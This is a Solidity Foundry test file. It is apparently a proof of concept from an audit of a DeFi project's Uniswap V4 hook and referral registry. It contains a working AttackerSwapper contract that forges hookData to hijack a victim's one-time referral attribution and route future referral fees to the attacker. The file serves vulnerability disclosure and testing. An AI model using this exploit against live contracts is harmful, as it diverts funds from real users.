// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {IPoolManager, SwapParams} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency, CurrencyLibrary} from "@uniswap/v4-core/src/types/Currency.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";

import {PSPFactory} from "../../src/PSPFactory.sol";
import {HookDeployer} from "../../src/HookDeployer.sol";
import {ControllerDeployer} from "../../src/ControllerDeployer.sol";
import {StakerDeployer} from "../../src/StakerDeployer.sol";
import {RoundController} from "../../src/RoundController.sol";
import {CurveHook} from "../../src/CurveHook.sol";
import {PSPStaker} from "../../src/PSPStaker.sol";
import {PSPToken} from "../../src/PSPToken.sol";
import {CurveMath} from "../../src/libraries/CurveMath.sol";
import {PSPZapIn} from "../../src/PSPZapIn.sol";
import {IMixETH} from "../../src/interfaces/IMixETH.sol";
import {PSPReferralRegistry} from "../../src/PSPReferralRegistry.sol";

import {MainnetConfig} from "./MainnetConfig.sol";
import {MockMixETH} from "../mocks/MockMixETH.sol";

/// @dev minimal direct-to-PM swapper carrying FORGED hookData — the attacker
///      side of finding A-1. The swap itself settles honestly; ONLY the
///      64 hookData bytes naming (trader, referrerNft) are forged.
contract AttackerSwapper {
    IPoolManager public immutable pm;

    constructor(IPoolManager _pm) {
        pm = _pm;
    }

    function attack(
        PoolKey calldata key,
        uint256 mixIn,
        address forgedTrader,
        uint256 forgedRefNft,
        IERC20 mixETH
    ) external {
        mixETH.transferFrom(msg.sender, address(this), mixIn);
        pm.unlock(abi.encode(key, mixIn, forgedTrader, forgedRefNft, mixETH));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm), "not pm");
        (
            PoolKey memory key,
            uint256 mixIn,
            address forgedTrader,
            uint256 forgedRefNft,
            IERC20 mixETH
        ) = abi.decode(data, (PoolKey, uint256, address, uint256, IERC20));
        // standard V4 settlement of the mixETH input
        pm.sync(Currency.wrap(address(mixETH)));
        mixETH.transfer(address(pm), mixIn);
        pm.settle();
        // the swap itself is honest; ONLY the hookData is forged. The hook
        // cannot verify who really trades — it trusts these bytes.
        BalanceDelta delta = pm.swap(
            key,
            SwapParams({
                amountSpecified: -int256(int128(uint128(mixIn))),
                sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1,
                zeroForOne: Currency.unwrap(key.currency0) == address(mixETH)
            }),
            abi.encode(forgedTrader, forgedRefNft)
        );
        // take the PSP out so all deltas settle before unlock ends
        bool mixIsZero = Currency.unwrap(key.currency0) == address(mixETH);
        int128 pspDelta = mixIsZero ? delta.amount1() : delta.amount0();
        if (pspDelta > 0) {
            pm.take(mixIsZero ? key.currency1 : key.currency0, address(this), uint256(uint128(pspDelta)));
        }
        return "";
    }
}

/// @title PoisonedAttributionTest — PoC for the forged-hookData referral
///        attribution attack (multi-agent audit 2026-08-23, finding A-1).
///
///        Vector: PSPReferralRegistry.recordFor is authorized-hook-only, but
///        the HOOK decodes (trader, referrerNftId) from V4 hookData, which
///        ANY pool caller controls on a direct poolManager.swap — not just
///        the canonical zaps. A qualified attacker who swaps directly with
///        hookData=(victim, attackerNft) permanently binds the victim's
///        one-time lazy attribution to the ATTACKER's chain before the
///        victim's first attributed trade. Every future trade by the victim
///        then pays the 50bps referral carve-out to the attacker's chain.
///
///        Documented as accepted-by-design for MALICIOUS RECORDERS (a rogue
///        zap burning its own users' attribution) — but this PoC shows the
///        attacker needs no zap at all: the legitimate hook itself performs
///        the poisoned record when fed forged bytes by a direct swapper.
contract PoisonedAttributionTest is Test {
    using CurrencyLibrary for Currency;

    MockMixETH mixETH;
    PSPFactory factory;
    RoundController controller;
    CurveHook hook;
    PSPStaker stakerV;
    PSPToken psp;
    PSPZapIn zapIn;
    PSPReferralRegistry registry;
    PoolKey poolKey;
    IPoolManager pm;

    address alice = makeAddr("alice"); // intended referrer (qualified)
    address mallory = makeAddr("mallory"); // attacker (qualified)
    address bob = makeAddr("bob"); // victim — never traded
    address relayer = makeAddr("relayer"); // funds the attack contract

    AttackerSwapper attacker;

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));
        pm = IPoolManager(MainnetConfig.POOL_MANAGER);
        vm.deal(address(pm), 100_001e18); // the prank makes pm pay the deposit value
        vm.startPrank(address(pm));
        mixETH = new MockMixETH();
        mixETH.depositETH{value: 100_000e18}();
        vm.stopPrank();

        HookDeployer hd = new HookDeployer();
        ControllerDeployer cd = new ControllerDeployer();
        StakerDeployer sd = new StakerDeployer();
        factory = new PSPFactory(pm, IERC20(address(mixETH)), hd, cd, sd, 0);

        CurveMath.CurveConfig memory cfg = CurveMath.singleCurve(0.001e18, 1_000_000e18, 0.0000000046e18, 0.05e18);
        PSPFactory.RoundParams memory params =
            PSPFactory.RoundParams({name: "Positive Sum Pepes 1", symbol: "PSP1", curveConfig: cfg});
        (, address hookAddr) = factory.deployRound(params);

        RoundController c = RoundController(factory.getRound(1).controller);
        controller = c;
        hook = CurveHook(hookAddr);
        stakerV = PSPStaker(c.staker());
        psp = PSPToken(address(factory.getRound(1).token));

        Currency mixCur = Currency.wrap(address(mixETH));
        Currency pspCur = Currency.wrap(address(psp));
        (Currency c0, Currency c1) = mixCur < pspCur ? (mixCur, pspCur) : (pspCur, mixCur);
        poolKey = PoolKey({currency0: c0, currency1: c1, fee: 0x800000, tickSpacing: 60, hooks: hook});

        zapIn = new PSPZapIn(IMixETH(address(mixETH)), pm);
        registry = PSPReferralRegistry(factory.referralRegistryOf(1));

        _deal(alice, 2_000e18);
        _deal(mallory, 2_000e18);
        _deal(bob, 1_000e18);
        _deal(relayer, 100e18);

        attacker = new AttackerSwapper(pm);
    }

    function _deal(address to, uint256 amount) internal {
        vm.prank(address(pm)); // the mint sits at pm (pranked depositor)
        mixETH.transfer(to, amount);
    }

    function _buyViaZap(address user, uint256 mixAmount, uint256 refNft) internal returns (uint256) {
        vm.startPrank(user);
        mixETH.approve(address(zapIn), mixAmount);
        uint256 out = zapIn.buyWithMix(poolKey, mixAmount, 0, 0, refNft);
        vm.stopPrank();
        return out;
    }

    function _buyPlain(address user, uint256 mixAmount) internal returns (uint256) {
        return _buyViaZap(user, mixAmount, 0);
    }

    function _predepositAndLaunch(address user, uint256 amount) internal {
        vm.startPrank(user);
        mixETH.approve(address(controller), amount);
        controller.predeposit(amount);
        vm.stopPrank();
        skip(7 days + 1);
        vm.prank(user);
        controller.launchPooledBuy();
        vm.prank(user);
        controller.claimPredepositPSP();
        skip(1);
    }

    function test_PoC_ForgedHookDataStealsVictimAttribution() public {
        // ── arrange: two QUALIFIED referrers (≥1000 PSP locked each) ──
        _predepositAndLaunch(alice, 200e18);
        uint256 aliceNft = stakerV.tokenOf(alice);
        assertGt(stakerV.lockedPSPOf(alice), 1_000e18, "alice qualified");

        uint256 mBag = _buyPlain(mallory, 1_200e18); // ~≥1000 PSP at P0=0.001
        vm.startPrank(mallory);
        psp.approve(address(stakerV), mBag);
        stakerV.lock(mBag);
        vm.stopPrank();
        uint256 malloryNft = stakerV.tokenOf(mallory);
        assertGt(stakerV.lockedPSPOf(mallory), 1_000e18, "mallory qualified");

        // victim untouched
        assertFalse(registry.attributed(bob), "bob not yet attributed");

        // ── act: attacker swaps DIRECTLY on the pool with forged hookData ──
        vm.startPrank(relayer);
        mixETH.approve(address(attacker), 5e18);
        attacker.attack(poolKey, 5e18, bob, malloryNft, IERC20(address(mixETH)));
        vm.stopPrank();

        // ── assert: bob's one-time attribution is stolen ──
        assertTrue(registry.attributed(bob), "A-1: victim attribution consumed by forged swap");
        (address[5] memory who,) = registry.payoutFor(bob);
        assertEq(who[0], mallory, "A-1: tier-1 payout now routes to the ATTACKER");

        // bob's LEGIT first attributed trade (via the canonical zap, naming
        // alice) can no longer bind alice — the lazy record skips silently
        // and the carve-out pays mallory's chain on every future trade
        uint256 bobBag = _buyViaZap(bob, 10e18, aliceNft);
        assertGt(bobBag, 0);
        (who,) = registry.payoutFor(bob);
        assertEq(who[0], mallory, "A-1: every future bob trade pays the attacker's chain");

        console.log("PoC: victim referral stream hijacked to attacker NFT", malloryNft);
    }
}
